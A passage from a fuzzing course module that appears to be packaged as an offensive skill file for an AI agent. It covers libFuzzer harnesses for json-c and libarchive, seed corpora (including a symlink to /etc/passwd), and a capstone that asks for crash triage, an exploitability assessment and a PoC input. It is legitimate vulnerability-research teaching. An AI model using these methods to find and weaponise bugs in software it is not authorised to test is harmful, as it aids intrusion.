    - [ClusterFuzz](https://google.github.io/clusterfuzz/) - Continuous fuzzing infrastructure
  - _Concepts_:
    - Harness design principles
    - In-process vs out-of-process fuzzing
    - Persistent mode optimization
    - Seed corpus curation
    - Continuous fuzzing integration

### What is a Fuzzing Harness?

A fuzzing harness is the code that:

1. Receives fuzzer-generated input
2. Prepares that input for the target API
3. Calls the target functionality
4. Handles errors/cleanup

**Example - Bad Harness vs Good Harness**:

```cpp
// BAD HARNESS: Slow, inefficient
int main(int argc, char **argv) {
    FILE *f = fopen(argv[1], "rb");  // File I/O every iteration!
    // ... read file ...
    // ... call target API ...
    fclose(f);
    return 0;
}

// GOOD HARNESS: Fast, in-process
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Direct memory buffer, no I/O
    // Called thousands of times per second in same process
    target_api(data, size);
    return 0;
}
```

### Case Study: Writing Harness for JSON Parser

**Target**: json-c library (real-world JSON parser)

```bash
mkdir -p ~/harness_dev && cd ~/harness_dev && mkdir json_harness && cd json_harness

# Clone json-c
git clone --depth 1 https://github.com/json-c/json-c.git

cd ~/harness_dev/json_harness/json-c
export CC=clang-19
export CXX=clang++-19
export CFLAGS="-fno-sanitize-coverage=trace-cmp -fsanitize=fuzzer-no-link,address -g -O1"
export CXXFLAGS="-fno-sanitize-coverage=trace-cmp -fsanitize=fuzzer-no-link,address -g -O1"
cmake -DBUILD_SHARED_LIBS=OFF ./
make -j$(nproc)

cd ~/harness_dev/json_harness

# Create fuzzing harness
cat > fuzz_parse.c << 'EOF'
#include <json-c/json.h>
#include <stdint.h>
#include <stddef.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    const char *data1 = (const char *)data;
    json_tokener *tok = json_tokener_new();
    json_object *obj = json_tokener_parse_ex(tok, data1, size);

    if (obj) {
        // Exercise different API functions to increase coverage
        json_object_to_json_string_ext(obj, JSON_C_TO_STRING_PRETTY | JSON_C_TO_STRING_SPACED);

        if (json_object_is_type(obj, json_type_object)) {
            json_object_object_foreach(obj, key, val) {
                (void)json_object_get_type(val);
                (void)json_object_get_string(val);
            }
        }

        if (json_object_is_type(obj, json_type_array)) {
            size_t len = json_object_array_length(obj);
            for (size_t i = 0; i < len; i++) {
                json_object_array_get_idx(obj, i);
            }
        }

        json_object_put(obj);
    }

    json_tokener_free(tok);
    return 0;
}
EOF

# Compile with libFuzzer
clang-19 -g -fsanitize=address,fuzzer \
    -fno-sanitize-coverage=trace-cmp \
    -I. -Ijson-c \
    fuzz_parse.c \
    json-c/libjson-c.a \
    -o fuzz_json

# Create seed corpus
mkdir -p corpus
cat > corpus/valid1.json << 'EOF'
{"name": "test", "value": 42}
EOF

cat > corpus/valid2.json << 'EOF'
[1, 2, 3, {"nested": "object"}]
EOF

cat > corpus/valid3.json << 'EOF'
{
    "string": "value",
    "number": 123,
    "boolean": true,
    "null": null,
    "array": [1, 2, 3],
    "object": {"key": "value"}
}
EOF

# Run libFuzzer, it might take a while to actually crash
./fuzz_json corpus/ -max_total_time=300 -print_final_stats=1 -max_len=10000
```

#### Harness Design Principles Applied

1. **In-process execution**: `LLVMFuzzerTestOneInput` - no fork/exec overhead
2. **Direct API targeting**: Calls `json_tokener_parse_ex` directly
3. **Coverage maximization**: Exercises multiple code paths (objects, arrays, serialization)
4. **Proper cleanup**: Frees allocated memory to avoid OOM
5. **Sanitizer-friendly**: Works with ASAN/UBSAN for bug detection

### Case Study: Fuzzing Archive Extractors

While CVE-2023-38831 was in closed-source WinRAR, let's fuzz open-source alternatives with similar architectures.

```bash
cd ~/harness_dev && mkdir archive_campaign && cd archive_campaign

# Target: libarchive (used by many archive tools)
git clone --depth 1 --branch v3.5.1 https://github.com/libarchive/libarchive.git
cd ~/harness_dev/archive_campaign/libarchive

export CC=clang-19
export CXX=clang++-19
export CFLAGS="-fno-sanitize-coverage=trace-cmp -fsanitize=fuzzer-no-link,undefined,address -g -O1"
export CXXFLAGS="-fno-sanitize-coverage=trace-cmp -fsanitize=fuzzer-no-link,undefined,address -g -O1"

cmake -DENABLE_TEST=OFF .
make -j$(nproc)

cd ~/harness_dev/archive_campaign/

cat > fuzz_archive_read.c << 'EOF'
#include "archive.h"
#include "archive_entry.h"
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    struct archive *a;
    struct archive_entry *entry;
    int r;

    a = archive_read_new();
    if (!a) return 0;

    archive_read_support_filter_all(a);
    archive_read_support_format_all(a);

    r = archive_read_open_memory(a, data, size);
    if (r != ARCHIVE_OK) {
        archive_read_free(a);
        return 0;
    }

    while (archive_read_next_header(a, &entry) == ARCHIVE_OK) {
        const char *name = archive_entry_pathname(entry);
        int64_t size = archive_entry_size(entry);
        mode_t mode = archive_entry_mode(entry);
        time_t mtime = archive_entry_mtime(entry);

        const char *linkname = archive_entry_symlink(entry);
        const char *hardlink = archive_entry_hardlink(entry);

        const void *buff;
        size_t read_size;
        int64_t offset;
        while (archive_read_data_block(a, &buff, &read_size, &offset) == ARCHIVE_OK) {
            // Just consume data, no processing needed
        }
    }

    archive_read_free(a);
    return 0;
}
EOF

# Compile harness
clang-19 -g -O1 -fsanitize=address,undefined,fuzzer \
    -fno-sanitize-coverage=trace-cmp \
    -I./libarchive/libarchive \
    fuzz_archive_read.c -o fuzz_archive \
    libarchive/libarchive/libarchive.a \
    -lz -llzma -lzstd -lxml2 -lcrypto -ldl -lpthread

# Build diverse seed corpus
mkdir -p corpus_archive

# Valid archives of different formats
# ZIP
echo "Test file" > /tmp/test.txt
zip corpus_archive/sample.zip /tmp/test.txt

# TAR.GZ
tar czf corpus_archive/sample.tar.gz /tmp/test.txt

# 7z (if available)
7z a corpus_archive/sample.7z /tmp/test.txt 2>/dev/null || true

# RAR (if available)
rar a corpus_archive/sample.rar /tmp/test.txt 2>/dev/null || true

# Archive with symlink (common bug location)
ln -sf /etc/passwd /tmp/symlink_test
tar czf corpus_archive/with_symlink.tar.gz /tmp/symlink_test 2>/dev/null || true

# Run fuzzing campaign
./fuzz_archive corpus_archive/ \
    -max_total_time=3600 \
    -timeout=30 \
    -rss_limit_mb=2048 \
    -print_final_stats=1
```

**What This Campaign Targets**:

1. **Format parsing bugs**: TAR, ZIP, RAR, 7z, etc.
2. **Compression algorithms**: gzip, bzip2, lzma, zstd
3. **Path traversal**: Symlink/hardlink handling (like CVE-2023-38831)
4. **Metadata parsing**: Timestamps, permissions, extended attributes
5. **Memory corruption**: Buffer overflows in decompression routines

**Expected Findings** (based on real OSS-Fuzz results):

- Integer overflows in size calculations
- Path traversal via symlinks
- Buffer overflows in compression codecs
- Use-after-free in error handling paths

### Key Takeaways

1. **Harness Design is Critical**: Efficient harnesses (in-process, persistent) significantly outperform naive `fork()/exec()` wrappers.
2. **Target Logic, Not Just I/O**: Good harnesses bypass CLI parsing to exercise core API logic directly (e.g., `json_tokener_parse_ex`).
3. **Seed Corpus Quality**: A diverse, minimized corpus of valid inputs accelerates code coverage discovery.
4. **Sanitizers Enable Detection**: Memory bugs (ASAN) and undefined behavior (UBSAN) are only found if the harness is compiled with them.
5. **Continuous Integration**: Tools like OSS-Fuzz automate the "find → fix → verify" loop, preventing regressions in evolved code.

### Discussion Questions

1. Why is an in-process harness (like `LLVMFuzzerTestOneInput`) orders of magnitude faster than a file-based CLI wrapper?
2. How does defining a proper seed corpus (e.g., valid JSON/ZIP files) help the fuzzer penetrate deeper into the target's logic?
3. What are the risks of "over-mocking" in a harness (e.g., bypassing too much initialization) versus "under-mocking" (doing too much I/O)?
4. How do you handle state cleanup in a persistent-mode harness to prevent false positives from memory leaks or global state pollution?
5. Why is it important to fuzz different layers of an application (e.g., the compression layer vs. the archive parsing layer) separately?

## Week 2 Capstone Project: The Fuzzing Campaign

- **Goal**: Apply the week's techniques to discover and analyze a vulnerability in a real-world open source target or a complex challenge binary.
- **Activities**:
  - **Select a Target**:
    - Choose a C/C++ library that parses complex data (e.g., JSON, XML, Images, Archives, Network Packets).
    - Suggestions: `json-c`, `libarchive`, `libpng`, `tinyxml2`, `mbedtls`, or a known vulnerable version of a project (e.g., `libwebp` 1.0.0).
  - **Harness Development**:
    - Write a `LLVMFuzzerTestOneInput` harness or an AFL++ persistent mode harness.
    - Ensure the harness compiles with ASAN and UBSAN.
  - **Campaign Execution**:
    - Gather a valid seed corpus (from the internet or by generating samples).
    - Minimize the corpus using `afl-cmin` or `afl-tmin` (or libFuzzer's merge mode).
    - Run the fuzzer for at least 4 hours (or until a crash is found).
  - **Triage and Analysis**:
    - Deduplicate crashes.
    - Use GDB and ASAN reports to identify the root cause (e.g., Heap Overflow, UAF).
    - Determine exploitability (Control of instruction pointer? Arbitrary write?).
  - **Report**:
    - Document the target, harness code, campaign commands, and crash analysis.

### Deliverables

- A `fuzzing_report.md` containing:
  - **Target Details**: Project name, version, and function targeted.
  - **Harness Code**: The C/C++ harness you wrote.
  - **Campaign Stats**: Fuzzer used, duration, executions/sec, and coverage achieved.
  - **Crash Analysis**: ASAN output, GDB investigation, and root cause explanation.
  - **PoC**: A minimal input file that triggers the crash.

### Looking Ahead to Week 3

Next week, you'll learn patch diffing - analyzing security updates to understand what was fixed and discovering variant vulnerabilities. You'll see how fuzzing discoveries lead to patches, and how analyzing those patches can reveal additional bugs.

<!-- Written by AnotherOne from @Pwn3rzs Telegram channel -->

---

## Attribution

Ported from [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
(`Skills/*/offensive-fuzzing-course`), Apache-2.0 licensed. Methodology preserved; Claude-specific
mechanics rewritten for OSA's builtin tools.

Part of the offensive skill library — see also `penetration-testing` for the
full-engagement workflow and `offensive-osint` / `osint-methodology` for
reconnaissance methodology.

## Tool status note

External CLI tools referenced above are classified at authoring time as `[LOCAL]`
(verified present), `[INSTALL]` (one-command install), or `[UPSTREAM-REF]`
(needs API keys or interactive use — methodology reference only). If you invoke a
tool and it is absent, check for an `[INSTALL]` note or fall back to the OSA
builtin tools; never fabricate tool output.
